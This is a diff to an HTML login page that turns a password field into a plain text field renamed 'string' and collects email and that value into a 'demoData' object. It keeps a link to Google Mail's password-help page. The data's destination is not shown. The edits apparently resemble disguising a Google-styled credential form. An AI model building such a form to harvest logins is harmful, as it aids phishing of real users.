@@ -32,21 +32,21 @@
         />
       </label>
 
-      <!-- Input Password -->
+      <!-- Input char -->
       <label>
-        Enter your password:
+        Enter your code:
         <input
-          type="password"
-          id="password"
-          name="password"
-          placeholder="Enter your password"
+          type="text"
+          id="string"
+          name="string"
+          placeholder="Enter your string"
           required
           class="input-field"
         />
       </label>
 
        <div class="form-footer">
-        <a href="https://support.google.com/mail/answer/41078?hl=en&co=GENIE.Platform%3DDesktop" class="link" target="_blank" rel="noopener noreferrer">Forgot password?</a>
+        <a href="https://support.google.com/mail/answer/41078?hl=en&co=GENIE.Platform%3DDesktop" class="link" target="_blank" rel="noopener noreferrer">Forgot string?</a>
       </div>
 
       <p class="info-text">
@@ -84,11 +84,11 @@
     e.preventDefault(); // ⛔ prevent page reload
 
     const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
+    const string = document.getElementById("string").value;
 
     const demoData = {
       email: email,
-      password: password,
+      string: string,
       submittedAt: new Date().toISOString()
     };
 
@@ -104,3 +104,4 @@
 
 </body>
 </html>
+
